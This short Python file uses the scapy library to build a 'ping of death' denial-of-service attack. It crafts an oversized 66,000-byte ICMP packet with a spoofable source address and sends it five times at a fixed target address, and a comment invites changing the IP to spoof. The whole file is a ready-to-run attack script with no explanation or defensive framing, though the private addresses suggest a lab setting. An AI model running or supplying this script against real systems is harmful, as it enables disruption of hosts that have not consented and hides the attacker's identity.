from scapy.all import *

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"
NUMBER_PACKETS = 5 # Number of pings

def ping_of_death(SOURCE_IP = "10.1.5.3"):
    ping_of_death = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/("A"*66000)

    send(NUMBER_PACKETS * ping_of_death)